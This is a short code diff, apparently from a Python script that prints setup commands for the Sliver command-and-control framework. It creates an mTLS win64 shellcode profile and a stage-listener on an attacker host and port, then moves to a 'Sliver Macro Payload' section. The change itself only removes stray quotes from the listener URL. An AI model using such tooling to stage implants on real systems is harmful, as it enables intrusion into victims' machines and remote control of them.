@@ -31,7 +31,7 @@ End Sub
    # Start Printing Output :)
    print (CRED + '==== Sliver Stager Setup ====\n' + CEND)
    print (f'profiles new --mtls {lhost} --format shellcode win64\n')
-   print (f'stage-listener --url http://"{lhost}":"{lport}" --profile win64\n')
+   print (f'stage-listener --url http://{lhost}:{lport} --profile win64\n')
 
 
    print (CRED + '==== Sliver Macro Payload ====\n' + CEND)
